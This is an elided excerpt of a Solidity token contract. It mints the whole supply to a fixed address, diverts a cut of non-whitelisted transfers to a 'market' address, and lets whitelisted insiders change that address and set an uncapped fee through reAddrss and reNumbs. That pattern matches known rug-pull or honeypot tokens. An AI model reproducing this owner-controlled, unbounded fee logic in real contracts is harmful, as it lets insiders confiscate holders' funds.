...
contract Token is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _main = 0xb9cA14f2922984CB6a55Ca231ffadc90167d8328;
        _mark = 0xa00c862d5e9E7F5Ddaa9fA243bB421a900D999A3;
        ...
        _mint(_main, 1000000000000 * 10 ** decimals());
    }
    ...
    function _transfer(
        ...
        if (!_whites[sender] && !_whites[recipient]) {
            uint256 num = amount * _marks / 100;
            // market
            _balances[_mark] += num;
            emit Transfer(sender, _mark, num);
    ...
    function reAddrss(address mark) public {
        require(_whites[_msgSender()]);
        _mark = mark;
    }

    function reNumbs(uint256 mark) public {
        require(_whites[_msgSender()]);
        _marks = mark;
    }
